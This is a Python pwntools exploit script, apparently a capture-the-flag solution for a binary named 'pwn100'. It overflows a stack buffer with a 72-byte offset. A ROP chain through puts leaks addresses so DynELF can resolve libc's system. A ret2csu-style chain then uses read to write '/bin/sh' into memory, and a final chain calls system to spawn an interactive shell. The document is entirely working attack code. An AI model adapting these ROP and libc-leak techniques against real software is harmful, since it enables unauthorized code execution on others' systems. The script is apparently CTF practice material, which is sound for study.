from pwn import *

sh = process("./pwn100")
elf = ELF("./pwn100")

pop_rdi_addr = 0x400763
start_addr = 0x400550
puts_addr = elf.symbols["puts"]

# 用于传入DynELF的函数参数
def leak(addr):
    payload = b'a'*72 + p64(pop_rdi_addr) + p64(addr) + p64(puts_addr) + p64(start_addr)
    payload += b'A' * (200-len(payload))
    sh.send(payload)
    sh.recvuntil(b"bye~\n")
    data = sh.recv()
 
    data = data[:-1]
    if not data:
        data = b"\x00"
    data = data[:4]
    
    return data

d = DynELF(leak, elf=elf)
system_addr = d.lookup("system", "libc")

print("system addr:", hex(system_addr))

# 写字符串"/bin/sh"
str_addr = 0x601060
pop_addr = 0x40075a   
mov_addr = 0x400740

read_got = elf.got["read"]
payload = b'a'*72 + p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(str_addr) + p64(0) + p64(mov_addr) + b'A'*56 + p64(start_addr)
payload += b'A' * (200-len(payload))
sh.send(payload)
sh.recvuntil(b"bye~\n")
sh.send("/bin/sh\x00")

# get shell
payload = b'a'*72 + p64(pop_rdi_addr) + p64(str_addr) + p64(system_addr) + p64(start_addr)
payload += b'A' * (200-len(payload))
sh.send(payload)
sh.interactive()
